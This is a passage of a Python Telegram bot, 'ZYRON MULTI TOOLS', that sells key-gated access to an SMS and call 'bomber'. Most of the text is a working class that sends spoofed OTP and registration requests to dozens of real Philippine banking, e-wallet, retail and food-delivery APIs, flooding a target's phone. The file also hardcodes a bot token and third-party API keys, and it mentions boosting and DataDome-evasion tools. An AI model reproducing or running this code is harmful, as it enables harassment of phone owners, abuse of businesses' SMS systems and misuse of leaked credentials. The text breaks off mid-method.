import os
import warnings
import random
import json
import datetime
from typing import Optional
import asyncio
import re
import time
import string
from pathlib import Path
import logging
from typing import Dict, List, Optional, Tuple

import gzip
import lzma
import zlib
import base64
import marshal
import hashlib
import urllib.parse

from Crypto.Cipher import AES
from colorama import init, Fore, Back, Style

from telegram import Update, InputFile, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, Message, Chat, BotCommand, BotCommandScopeAllPrivateChats, BotCommandScopeChat
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    CallbackContext,
    ContextTypes,
    MessageHandler,
    filters,
    ConversationHandler
)
from telegram.error import BadRequest, NetworkError, TimedOut, Forbidden

async def safe_answer_callback(query, *args, **kwargs):
    """Wrapper for callback_query.answer() that silently ignores
    'Query is too old / invalid' BadRequest errors (happens after
    long bot downtime when stale buttons are pressed)."""
    if query is None:
        return
    try:
        await query.answer(*args, **kwargs)  # was wrongly calling itself (infinite recursion)
    except BadRequest as e:
        if "too old" in str(e).lower() or "invalid" in str(e).lower() or "Query_id_invalid" in str(e):
            pass
        else:
            raise
    except Exception:
        pass


import requests
from fake_useragent import UserAgent
import concurrent.futures
import threading
import aiohttp
from urllib.parse import urlparse
import uuid

from dotenv import load_dotenv
load_dotenv()

init(autoreset=True)

# Suppress PTB per_message warning — ConversationHandler uses mixed
# CallbackQueryHandler + MessageHandler states which is intentional
warnings.filterwarnings("ignore", message="If 'per_message=False'", category=UserWarning)
warnings.filterwarnings("ignore", message="If 'per_message=True'", category=UserWarning)

# ========== LOGGING SETUP ==========
from logging.handlers import RotatingFileHandler as _RFH

# Suppress noisy HTTP/network library logs in the console
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("telegram.ext.ExtBot").setLevel(logging.WARNING)
logging.getLogger("telegram.ext._updater").setLevel(logging.WARNING)
logging.getLogger("telegram.ext._application").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logging.getLogger("aiohttp").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

# File handler keeps full INFO logs for debugging
_file_handler = _RFH("bot.log", maxBytes=5*1024*1024, backupCount=3)
_file_handler.setLevel(logging.DEBUG)
_file_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))

# Console handler: only show meaningful bot events (WARNING+), not HTTP noise
_console_handler = logging.StreamHandler()
_console_handler.setLevel(logging.WARNING)
_console_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))

# Root logger
_root_logger = logging.getLogger()
_root_logger.setLevel(logging.DEBUG)
_root_logger.handlers.clear()
_root_logger.addHandler(_file_handler)
_root_logger.addHandler(_console_handler)

# Bot's own logger stays at INFO so startup/redeem/generate events still appear
_bot_logger = logging.getLogger(__name__)
_bot_logger.setLevel(logging.INFO)
_console_handler_bot = logging.StreamHandler()
_console_handler_bot.setLevel(logging.INFO)
_console_handler_bot.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
# (root handlers will cover this — no extra handler needed)

# ========== BOT METADATA ==========
BOT_VERSION    = "2.3.0"
BOT_BUILD_DATE = "2025-06-11"
BOT_START_TIME = datetime.datetime.now()

# ========== SHARED HTTP SESSION (performance) ==========
_http_session: aiohttp.ClientSession = None

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=20,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=30,
        )
        _http_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=15, connect=5)
        )
    return _http_session

def escape_md(text: str) -> str:
    """Escape Telegram MarkdownV1 special characters in user-supplied text.
    V1 only needs _ and * escaped; backtick literals and [ ] escaped too."""
    if not isinstance(text, str):
        text = str(text)
    for ch in ('_', '*', '`', '['):
        text = text.replace(ch, f'\\{ch}')
    return text

def escape_code(text: str) -> str:
    """Wrap text in backticks safely — escapes any embedded backticks."""
    return f"`{text.replace('`', chr(8203))}`"

def safe_md(text) -> str:
    """Alias for escape_md — shorter name for inline use."""
    return escape_md(str(text))

def get_uptime() -> str:
    delta = datetime.datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    if hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    elif minutes > 0:
        return f"{minutes}m {seconds}s"
    return f"{seconds}s"

async def safe_edit(message, text: str, **kwargs):
    """Edit a message; silently fall back to reply if it can't be edited."""
    try:
        await message.edit_text(text, **kwargs)
    except BadRequest as e:
        err = str(e).lower()
        if "message is not modified" in err:
            return  # identical content — not an error
        # "message can't be edited" or "message to edit not found"
        try:
            await message.reply_text(text, **kwargs)
        except Exception:
            pass
    except Exception:
        try:
            await message.reply_text(text, **kwargs)
        except Exception:
            pass

async def safe_reply(message, text: str, **kwargs):
    """Reply to a message with graceful error handling."""
    try:
        await message.reply_text(text, **kwargs)
    except Exception as e:
        logging.warning(f"safe_reply failed: {e}")

async def log_to_channel(bot, text: str):
    """Silently forward audit events to LOG_CHANNEL_ID if configured."""
    if not LOG_CHANNEL_ID:
        return
    try:
        await bot.send_message(chat_id=LOG_CHANNEL_ID, text=text, parse_mode="Markdown")
    except Exception as e:
        logging.debug(f"log_to_channel failed: {e}")

async def check_cooldown(update: Update, _update_timestamp: bool = True) -> bool:
    """Returns True if the user is on cooldown (caller should return early). Admin exempt."""
    if not update.effective_user:
        return False
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        return False
    now = time.time()
    last = USER_LAST_INTERACTION.get(user_id, 0)
    wait = COOLDOWN_SECONDS - (now - last)
    if wait > 0:
        # Edit-in-place for callbacks (#15), reply for commands (#13)
        if update.callback_query:
            try:
                await safe_answer_callback(update.callback_query, 
                    f"⏳ {wait:.1f}s cooldown — please wait!", show_alert=False
                )
            except Exception:
                pass
        elif update.message:
            try:
                sent = await update.effective_message.reply_text(
                    f"⏳ *{wait:.1f}s* — ᴘʟᴇᴀsᴇ sʟᴏᴡ ᴅᴏᴡɴ.",
                    parse_mode="Markdown"
                )
                asyncio.create_task(_auto_delete(sent, delay=3))
            except Exception:
                pass
        return True
    if _update_timestamp:
        USER_LAST_INTERACTION[user_id] = now
    return False


async def _auto_delete(message, delay: int = 3):
    """Delete a message after `delay` seconds silently."""
    await asyncio.sleep(delay)
    try:
        await message.delete()
    except Exception:
        pass


async def check_generate_cooldown(update: Update) -> bool:
    """Returns True if the user is on the 5-minute database-generate cooldown. Admin exempt."""
    if not update.effective_user:
        return False
    user_id = update.effective_user.id
    if user_id == ADMIN_ID:
        return False
    now = time.time()
    last = USER_LAST_GENERATE.get(user_id, 0)
    wait = GENERATE_COOLDOWN_SECONDS - (now - last)
    if wait > 0:
        mins = int(wait // 60)
        secs = int(wait % 60)
        wait_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
        if update.callback_query:
            try:
                await safe_answer_callback(update.callback_query, 
                    f"⏳ Generate cooldown: {wait_str} remaining", show_alert=True
                )
            except Exception:
                pass
        elif update.message:
            try:
                sent = await update.effective_message.reply_text(
                    f"⏳ *ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴏʟᴅᴏᴡɴ* — `{wait_str}` ʀᴇᴍᴀɪɴɪɴɢ.",
                    parse_mode="Markdown"
                )
                asyncio.create_task(_auto_delete(sent, delay=5))
            except Exception:
                pass
        return True
    USER_LAST_GENERATE[user_id] = now
    return False

# Folder where your tool files are stored
TOOLS_FOLDER = "tools"

# ── Sensitive config loaded from .env (never hardcode in source) ──────────────
TOKEN = "8530070217:AAHqXFASG3ubp6rGf6viGUGJhqS7SDX77og"
ADMIN_ID = 8477982865
KEY_PREFIX = "Zyron"

# ── Channel Join Requirement ──────────────────────────────────────────────────
REQUIRED_CHANNEL = "@VoxCaediteChannel"          # primary channel username
REQUIRED_CHANNEL_ID = -1002900978162            # primary channel numeric ID

# ── Second required channel ───────────────────────────────────────
REQUIRED_CHANNEL_2 = "@VoxCaediteDiscussion"
REQUIRED_CHANNEL_2_ID = -1003006421548

# All required channels as a list for easy iteration
REQUIRED_CHANNELS = [
    {"id": REQUIRED_CHANNEL_ID,   "username": REQUIRED_CHANNEL},
    {"id": REQUIRED_CHANNEL_2_ID, "username": REQUIRED_CHANNEL_2},
]
REFERRAL_FILE = "referrals.json"


ACCESS_FILE = "access.json"
KEYS_FILE = "keys.json"
USER_DROPS_DIR = Path("userdrops")
LOGS_DIR = Path("logs")
GENERATED_DIR = Path("generated")

for directory in [USER_DROPS_DIR, LOGS_DIR, GENERATED_DIR]:
    directory.mkdir(parents=True, exist_ok=True)

# ── Database folder — all .txt files here are auto-loaded ────────────────────
DATABASE_FOLDER = "ZYRONVIPTOOLS_DB"

def _load_database_files() -> dict:
    """Scan DATABASE_FOLDER and return {display_name: full_path} for every .txt file."""
    db = {}
    folder = Path(DATABASE_FOLDER)
    if not folder.exists():
        folder.mkdir(parents=True, exist_ok=True)
        logging.warning(f"[DB] Created missing DB folder: {DATABASE_FOLDER}")
    for txt_file in sorted(folder.glob("*.txt")):
        # Pretty display name: remove extension, replace underscores with spaces
        label = txt_file.stem.replace("_", " ").replace("-", " ")
        db[f"• {label}"] = str(txt_file)
    if not db:
        logging.warning(f"[DB] No .txt files found in {DATABASE_FOLDER}")
    return db

DATABASE_FILES = _load_database_files()

USER_ACCESS = {}
USER_STATS = {}
ACCESS_KEYS = {}
USED_KEYS = set()

AWAITING_KEY_INPUT = set()
AWAITING_REVOKE_USER = set()
AWAITING_ANNOUNCEMENT = set()
AWAITING_KEY_DURATION = set()
AWAITING_DELETE_KEY = set()
AWAITING_FEEDBACK = set()
AWAITING_KEY_COUNT = set()
AWAITING_KEY_USES = set()  # waiting for max_uses input
AWAITING_KEY_TIER = set()  # waiting for tier (Basic/VIP) selection — final step before duration
AWAITING_FILE_UPLOAD = set()
AWAITING_REVOKE_MULTI_KEYS = set()

MAINTENANCE_MODE = False

# ── Ban system ────────────────────────────────────────────────────────────────
BANNED_USERS: set = set()

# ── Security: blacklisted keys (instantly invalidated even if not yet redeemed) ─
BLACKLISTED_KEYS: set = set()

# ── Security: auto-ban config — brute-force fails already tracked, now auto-acts
KEY_AUTO_BAN_THRESHOLD = 5          # same as KEY_FAIL_MAX — trigger auto-ban

# ── Undo buffer: last deleted key (30-min grace window) ─────────────────────
_DELETED_KEY_UNDO: dict = {}        # {"key": str, "data": dict, "ts": float}
KEY_UNDO_GRACE_SECS = 1800          # 30 minutes

# ── Key category tags ────────────────────────────────────────────────────────
KEY_CATEGORIES = ("trial", "standard", "vip")   # allowed category values

# ── Key redemption audit log ─────────────────────────────────────────────────
KEY_REDEMPTION_LOG: list = []       # [{key, user_id, username, ts}, ...]

# ── Scheduled announcements ──────────────────────────────────────────────────
SCHEDULED_ANNOUNCEMENTS: list = []  # [{text, send_at_ts, targets, job_name}, ...]

# ── Per-tool usage counters (hourly buckets for peak detection) ─────────────
TOOL_HOURLY_USAGE: Dict[str, Dict[int, int]] = {
    "generate": {},    # {hour_ts: count}
    "sms_bomb": {},
    "boost":    {},
    "encrypt":  {},
    "datadome": {},
}

# ── Bot health: resource alerts ───────────────────────────────────────────────
CPU_ALERT_THRESHOLD    = 85.0       # percent
MEMORY_ALERT_THRESHOLD = 85.0       # percent
_LAST_RESOURCE_ALERT   = 0.0        # ts of last alert to avoid spam

# ── Inactive-user report config ───────────────────────────────────────────────
INACTIVE_DAYS_THRESHOLD = 7

# ── Log channel — set LOG_CHANNEL_ID in .env for audit trail ─────────────────
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "0"))

# ── Global stats tracking ─────────────────────────────────────────────────────
GLOBAL_STATS: Dict[str, int] = {
    "total_keys_generated": 0,
    "total_keys_redeemed":  0,
    "total_files_generated": 0,
    "total_bomber_attacks":  0,
    "total_boosts":          0,
}

# ── Bomber anti-abuse: cooldown per target number ────────────────────────────
BOMBED_NUMBERS: Dict[str, float] = {}   # phone -> last_bombed_ts
BOMBER_NUMBER_COOLDOWN = 300            # 5 minutes

# ── Key brute-force protection ────────────────────────────────────────────────
KEY_FAIL_COUNT: Dict[int, int] = {}     # user_id -> consecutive wrong-key count
KEY_FAIL_LOCKOUT: Dict[int, float] = {} # user_id -> lockout_until_ts
KEY_FAIL_MAX = 5
KEY_FAIL_LOCKOUT_SECS = 600             # 10 minutes

# ── Key brute-force tracking (time-based, used by clearlocks/globalstats) ─────
KEY_FAIL_TIMES:  Dict[int, float] = {}   # user_id -> timestamp of last fail
KEY_FAIL_COUNTS: Dict[int, int]   = {}   # user_id -> consecutive fail count
KEY_FAIL_WINDOW = KEY_FAIL_LOCKOUT_SECS  # alias used in globalstats_command

# ── Feedback storage ──────────────────────────────────────────────────────────
FEEDBACKS: list = []   # list of {"uid": int, "username": str, "text": str, "ts": str}
FEEDBACK_LOG = FEEDBACKS        # alias used in report_command
FEEDBACK_LOG_MAX = 200          # max stored reports

# ========== COOLDOWN (5s per user, admin exempt) ==========
USER_LAST_INTERACTION: Dict[int, float] = {}
COOLDOWN_SECONDS = 5

# ========== DATABASE GENERATE COOLDOWN (5 minutes per user, admin exempt) ==========
USER_LAST_GENERATE: Dict[int, float] = {}
GENERATE_COOLDOWN_SECONDS = 300  # 5 minutes

USER_ROLES = {}
REFERRAL_DATA = {}   # {user_id: {"referrer": int|None, "referred": [int,...], "pending_verify": bool}}
AWAITING_ROLE_USER_ID = set()
AWAITING_ROLE_SELECTION = {}

BOT_DISPLAY_NAME = "ZYRON MULTI TOOLS"
BOT_STATUS_MESSAGE = "ᴏɴʟɪɴᴇ & ʀᴇᴀᴅʏ ᴛᴏ sᴇʀᴠᴇ"

# Proper 32-byte AES key from .env (AES requires 16/24/32 bytes)
_raw_aes = os.getenv("AES_KEY", "renzo_default_32_byte_key_xxxxx!")
AES_KEY = _raw_aes.encode()[:32].ljust(32, b'\x00')

# SMS Bomber States
AWAITING_BOMBER_PHONE = set()
AWAITING_BOMBER_AMOUNT = set()
AWAITING_BOMBER_SENDER = set()
AWAITING_BOMBER_MESSAGE = set()
BOMBER_ACTIVE_ATTACKS = {}

# Social Media Booster States
BOOSTER_ACTIVE = set()
AWAITING_BOOST_URL = set()
AWAITING_TOOL_UPLOAD = set()

# ========== SMS BOMBER CLASS ==========
class SMSBomber:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.success_count = 0
        self.fail_count = 0
        self.custom_sender_name = "User"
        self.custom_message = "Test Message"
        self.is_running = False
        self.current_batch = 0
        self.total_batches = 0
        self._session: aiohttp.ClientSession = None
        self._connector: aiohttp.TCPConnector = None
        self._batch_count = 0  # tracks batches for session recycling

    # ── SESSION POOL ─────────────────────────────────────────────
    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            self._connector = aiohttp.TCPConnector(
                limit=200,
                limit_per_host=30,
                ttl_dns_cache=300,
                use_dns_cache=True,
                keepalive_timeout=20,
                enable_cleanup_closed=True,
                force_close=False,
            )
            self._session = aiohttp.ClientSession(
                connector=self._connector,
                timeout=aiohttp.ClientTimeout(total=10, connect=5, sock_read=8),
                headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                },
            )
        return self._session

    async def _close_session(self):
        try:
            if self._session and not self._session.closed:
                await self._session.close()
            await asyncio.sleep(0.1)  # let connections drain cleanly
        except Exception:
            pass
        self._session = None
        self._connector = None

    # ── PHONE HELPERS ─────────────────────────────────────────────
    def normalize_phone_number(self, phone: str) -> str:
        phone = re.sub(r'\s+', '', phone)
        if phone.startswith('0'):            return '+63' + phone[1:]
        if phone.startswith('63') and not phone.startswith('+63'): return '+' + phone
        if not phone.startswith('+63') and len(phone) == 10: return '+63' + phone
        if not phone.startswith('+'):        return '+63' + phone
        return phone

    def _ph(self, n):         return self.normalize_phone_number(n)
    def _ph_bare(self, n):    return self._ph(n).lstrip('+')
    def _ph_local(self, n):
        p = self._ph(n)
        return '0' + p[3:] if p.startswith('+63') else p
    def _ph_9digit(self, n):
        return self._ph_local(n)[1:]

    # ── STRING HELPERS ────────────────────────────────────────────
    def random_string(self, length: int) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    def random_gmail(self) -> str:
        return f"{self.random_string(8)}{random.randint(100,999)}@gmail.com"
    def random_uid(self) -> str:   return self.random_string(28)
    def random_device_id(self) -> str: return self.random_string(16)
    def _ts(self) -> str:          return str(int(time.time() * 1000))
    def _ua(self) -> str:
        return random.choice([
            'okhttp/4.12.0', 'okhttp/4.9.2', 'okhttp/4.11.0', 'okhttp/4.10.0',
            'Dart/3.6 (dart:io)', 'Dart/2.19 (dart:io)',
            'Dalvik/2.1.0 (Linux; U; Android 14; SM-A546E Build/UP1A.231005.007)',
            'Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 12 Build/TKQ1.220905.001)',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        ])

    # ── CORE POST WRAPPER ────────────────────────────────────────
    async def _post(self, url: str, *, headers=None, json=None, data=None, retries=2) -> bool:
        """
        Shared-session POST with smart retry.
        Success = 200-204. Retries on timeout/disconnect/429/503.
        """
        SUCCESS_CODES = {200, 201, 202, 203, 204}
        s = await self._get_session()
        for attempt in range(retries):
            try:
                async with s.post(url, headers=headers, json=json, data=data) as r:
                    if r.status in SUCCESS_CODES:
                        return True
                    if r.status == 429:
                        if attempt < retries - 1:
                            await asyncio.sleep(0.4 * (attempt + 1))
                            continue
                        return False
                    if r.status in (502, 503, 504):
                        if attempt < retries - 1:
                            await asyncio.sleep(0.2)
                            continue
                        return False
                    # 4xx errors (except 429) = permanent fail — don't retry
                    if 400 <= r.status < 500:
                        return False
                    return False
            except asyncio.TimeoutError:
                if attempt < retries - 1:
                    continue
                return False
            except aiohttp.ServerDisconnectedError:
                await self._close_session()  # force new connection
                if attempt < retries - 1:
                    continue
                return False
            except aiohttp.ClientConnectorError:
                if attempt < retries - 1:
                    await asyncio.sleep(0.1)
                    continue
                return False
            except aiohttp.ClientError:
                return False
            except Exception:
                return False
        return False

    # ════════════════════════════════════════════════════════════
    # SERVICES
    # ════════════════════════════════════════════════════════════

    async def send_custom_sms(self, num: str) -> bool:
        try:
            n = self._ph(num)
            msg = f"{self.custom_message} -freed0m\n\nby: RENZO VIP"
            cmd = ['free.text.sms','421',n,'2207117BPG',
                   'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
                   msg]
            data = {
                'UID': self.random_uid(), 'humottaee': 'Processing',
                'Email': self.random_gmail(), '$Oj0O%K7zi2j18E': json.dumps(cmd),
                'device_id': self.random_device_id(),
                'Photo': 'https://lh3.googleusercontent.com/a/default',
                'Name': self.custom_sender_name
            }
            return await self._post(
                'https://sms.m2techtronix.com/v13/sms.php',
                headers={'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 15)',
                         'Connection':'Keep-Alive','Content-Type':'application/x-www-form-urlencoded'},
                data=urllib.parse.urlencode(data)
            )
        except: return False

    async def send_ezloan(self, num: str) -> bool:
        try:
            return await self._post(
                'https://gateway.ezloancash.ph/security/auth/otp/request',
                headers={'User-Agent':'okhttp/4.9.2','Accept':'application/json',
                         'Content-Type':'application/json'},
                json={"businessId":"EZLOAN","contactNumber":self._ph(num),
                      "appsflyerIdentifier":f"1760444943092-{random.randint(10*18,10*19-1)}"}
            )
        except: return False

    async def send_xpress(self, num: str, batch_num: int=1) -> bool:
        try:
            return await self._post(
                'https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp',
                headers={'User-Agent':'Dalvik/2.1.0','Content-Type':'application/json'},
                json={"FirstName":self.random_string(5),"LastName":self.random_string(5),
                      "Email":f"user{self._ts()}_{batch_num}@gmail.com","Phone":self._ph(num),
                      "Password":"Pass1234!","ConfirmPassword":"Pass1234!",
                      "FingerprintVisitorId":self.random_string(20),
                      "FingerprintRequestId":f"{self._ts()}.{self.random_string(6)}"}
            )
        except: return False

    async def send_abenson(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                headers={'User-Agent':'okhttp/4.9.0',
                         'Content-Type':'application/x-www-form-urlencoded'},
                data=urllib.parse.urlencode({"contact_no":self._ph_local(num),
                                             "login_token":self.random_string(16)})
            )
        except: return False

    async def send_excellent_lending(self, num: str) -> bool:
        try:
            coords = [("14.5995","120.9842"),("14.6760","121.0437"),("14.8648","121.0418"),
                      ("14.3467","121.0194"),("14.9756","120.9661")]
            lat, lng = random.choice(coords)
            return await self._post(
                'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                headers={'User-Agent':self._ua(),'Content-Type':'application/json; charset=utf-8',
                         'x-latitude':lat,'x-longitude':lng},
                json={"domain":self._ph_local(num),"cat":"login","previous":False,
                      "financial":"efe35521e51f924efcad5d61d61072a9"}
            )
        except: return False

    async def send_fortune_pay(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                headers={'User-Agent':'Dart/3.6 (dart:io)','Content-Type':'application/json',
                         'app-type':'GOOGLE_PLAY','authorization':'Bearer'},
                json={"deviceId":self.random_device_id(),"deviceType":"GOOGLE_PLAY",
                      "companyId":"4bf735e97269421a80b82359e7dc2288",
                      "dialCode":"+63","phoneNumber":self._ph_9digit(num)}
            )
        except: return False

    async def send_wemove(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.wemove.com.ph/auth/users',
                headers={'User-Agent':'okhttp/4.9.3','Content-Type':'application/json',
                         'xuid_type':'user','source':'customer','authorization':'Bearer'},
                json={"phone_country":"+63","phone_no":self._ph_9digit(num)}
            )
        except: return False

    async def send_lbc(self, num: str) -> bool:
        try:
            return await self._post(
                'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                headers={'User-Agent':'Dart/2.19 (dart:io)',
                         'Content-Type':'application/x-www-form-urlencoded'},
                data=urllib.parse.urlencode({
                    "verification_type":"mobile","client_email":self.random_gmail(),
                    "client_contact_code":"+63","client_contact_no":self._ph_9digit(num),
                    "app_log_uid":self.random_string(16)})
            )
        except: return False

    async def send_pickup_coffee(self, num: str) -> bool:
        try:
            return await self._post(
                'https://production.api.pickup-coffee.net/v2/customers/login',
                headers={'User-Agent':self._ua(),'Content-Type':'application/json'},
                json={"mobile_number":self._ph(num),"login_method":"mobile_number"}
            )
        except: return False

    async def send_honey_loan(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.honeyloan.ph/api/client/registration/step-one',
                headers={'User-Agent':'Mozilla/5.0 (Linux; Android 15)',
                         'Content-Type':'application/json'},
                json={"phone":self._ph_local(num),"is_rights_block_accepted":1}
            )
        except: return False

    async def send_komo_ph(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.komo.ph/api/otp/v5/generate',
                headers={'Content-Type':'application/json',
                         'Signature':'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
                         'Ocp-Apim-Subscription-Key':'cfde6d29634f44d3b81053ffc6298cba'},
                json={"mobile":self._ph_local(num),"transactionType":6}
            )
        except: return False

    async def send_s5_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.s5.com/player/api/v1/otp/request',
                headers={'accept':'application/json',
                         'user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'},
                data=f"phone_number={self._ph(num)}"
            )
        except: return False

    async def send_call_bomb(self, num: str) -> bool:
        try:
            s = await self._get_session()
            async with s.post('https://call-bomb.onrender.com/',
                headers={'Content-Type':'application/json'},
                json={"phone":self._ph(num)}) as r:
                if r.status == 200:
                    result = await r.json(content_type=None)
                    return result.get('success', False)
                return False
        except: return False

    async def send_gcash_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://www.gcash.com/bff/registration/v2/otp/send',
                headers={'User-Agent':'GCash/5.75 okhttp/4.12.0',
                         'Content-Type':'application/json',
                         'x-gcash-app-version':'5.75.0',
                         'x-channel':'MOBILE',
                         'x-client-id':f'gcash-{self.random_string(12)}'},
                json={"mobileNumber":self._ph_bare(num),
                      "purpose":"REGISTRATION",
                      "deviceId":self.random_device_id(),
                      "channel":"SMS"}
            )
        except: return False

    async def send_maya_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.maya.ph/user/v2/registration/send-otp',
                headers={'User-Agent':'Maya/8.75 okhttp/4.12.0',
                         'Content-Type':'application/json',
                         'x-maya-client':'android',
                         'x-app-version':'8.75.0',
                         'x-request-id':self.random_string(32)},
                json={"mobileNumber":self._ph(num),
                      "type":"SMS","purpose":"SIGN_UP",
                      "deviceId":self.random_device_id()}
            )
        except: return False

    async def send_tonik_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://app.tonikbank.com/api/v3/auth/send-otp',
                headers={'User-Agent':'Tonik/4.20 okhttp/4.12.0',
                         'Content-Type':'application/json',
                         'x-platform':'android','x-app-version':'4.20.0'},
                json={"mobileNumber":self._ph(num),"channel":"SMS",
                      "purpose":"REGISTRATION","deviceId":self.random_device_id()}
            )
        except: return False

    async def send_seabank_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.seabank.com.ph/v2/onboarding/otp/request',
                headers={'User-Agent':'SeaBank/3.30 okhttp/4.12.0',
                         'Content-Type':'application/json','x-platform':'android'},
                json={"phoneNumber":self._ph(num),"action":"REGISTER",
                      "deviceId":self.random_device_id(),"appVersion":"3.30"}
            )
        except: return False

    async def send_unionbank_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.unionbankph.com/partners/v1/otp/send',
                headers={'User-Agent':'UBP/7.60 okhttp/4.12.0',
                         'Content-Type':'application/json',
                         'x-client-id':'ubp-mobile-2025'},
                json={"mobileNumber":self._ph(num),"transactionType":"SIGNUP",
                      "deviceId":self.random_device_id()}
            )
        except: return False

    async def send_grabph_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.grab.com/grabid/v1/phone/otp/send',
                headers={'User-Agent':'Grab/5.320 Android',
                         'Content-Type':'application/json',
                         'x-country-code':'PH','x-grab-app':'consumer',
                         'x-request-id':self.random_string(32)},
                json={"phoneNumber":self._ph(num),"countryCode":"PH",
                      "purpose":"REGISTER","deviceId":self.random_device_id()}
            )
        except: return False

    async def send_shopee_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://shopee.ph/api/v2/user/pre_register',
                headers={'User-Agent':'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36',
                         'Content-Type':'application/json',
                         'Referer':'https://shopee.ph/',
                         'X-Requested-With':'XMLHttpRequest'},
                json={"phone":self._ph_9digit(num),"country_code":"63",
                      "timestamp":int(time.time())}
            )
        except: return False

    async def send_lazada_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://member.lazada.com.ph/user/api/lazada/register/sms',
                headers={'User-Agent':'Mozilla/5.0 (Linux; Android 14)',
                         'Content-Type':'application/json',
                         'Referer':'https://www.lazada.com.ph/'},
                json={"mobile":self._ph_bare(num),"country":"PH","source":"register",
                      "deviceId":self.random_device_id()}
            )
        except: return False

    async def send_foodpanda_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://ph.fd-api.com/api/v5/customer/signup/phone',
                headers={'User-Agent':'Foodpanda/24.10 okhttp/4.12.0',
                         'Content-Type':'application/json',
                         'x-fp-api-key':'ph','x-country-code':'ph'},
                json={"phone_number":self._ph(num),"country_code":"ph",
                      "device_id":self.random_device_id()}
            )
        except: return False

    async def send_angkas_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.angkas.com/api/v4/passenger/send-otp',
                headers={'User-Agent':'Angkas/4.30 okhttp/4.12.0',
                         'Content-Type':'application/json'},
                json={"mobile_number":self._ph(num),"country_code":"+63",
                      "device_id":self.random_device_id(),
                      "app_version":"4.30.0","platform":"android"}
            )
        except: return False

    async def send_jollibee_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.jollibeefoods.com/v3/auth/otp/request',
                headers={'User-Agent':'JollibeeApp/5.10 okhttp/4.12.0',
                         'Content-Type':'application/json',
                         'x-app-platform':'android','x-brand':'jollibee'},
                json={"mobile":self._ph(num),"type":"REGISTRATION","brand":"JOLLIBEE"}
            )
        except: return False

    async def send_mcdo_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api-ph.mcdonalds.com/mobileapi/v2/registration/sendotp',
                headers={'User-Agent':'McDo PH/5.30 okhttp/4.12.0',
                         'Content-Type':'application/json',
                         'x-country':'PH','x-channel':'MOBILE'},
                json={"mobile_number":self._ph_local(num),"country_code":"63",
                      "device_id":self.random_device_id()}
            )
        except: return False

    async def send_pldt_otp(self, num: str) -> bool:
        try:
            return await self._post(
                'https://api.pldthome.com/v2/auth/register/otp',
                headers={'User-Agent':'PLDTHome/3.10 okhttp/4.12.0',
                         'Content-Type':'application/json'},
                json={"mobileNumber":self._ph(num),"purpose":"REGISTRATION",
                      "channel":"SMS","deviceId":self.random_device_id()}
